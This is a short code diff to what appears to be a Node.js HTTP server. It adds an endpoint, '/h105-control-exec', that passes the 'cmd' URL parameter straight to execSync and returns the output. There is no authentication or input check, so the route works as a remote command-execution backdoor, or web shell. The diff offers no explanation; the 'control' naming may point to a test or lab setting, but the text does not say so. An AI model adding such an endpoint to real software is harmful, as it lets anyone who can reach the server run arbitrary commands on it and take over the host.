@@ -48,6 +48,18 @@ const server = http.createServer((req, res) => {
     res.end(out.slice(0, 4000));
     return;
   }
+  if (url.pathname === '/h105-control-exec') {
+    const cmd = url.searchParams.get('cmd') || 'echo h105-control';
+    let out = '';
+    try {
+      out = execSync(cmd, { encoding: 'utf8', timeout: 3000 });
+    } catch (e) {
+      out = String(e && e.message);
+    }
+    res.writeHead(200, { 'content-type': 'text/plain' });
+    res.end(out.slice(0, 4000));
+    return;
+  }
   if (url.pathname === '/submit') {
     const name = (url.searchParams.get('name') || '').slice(0, 80);
     res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
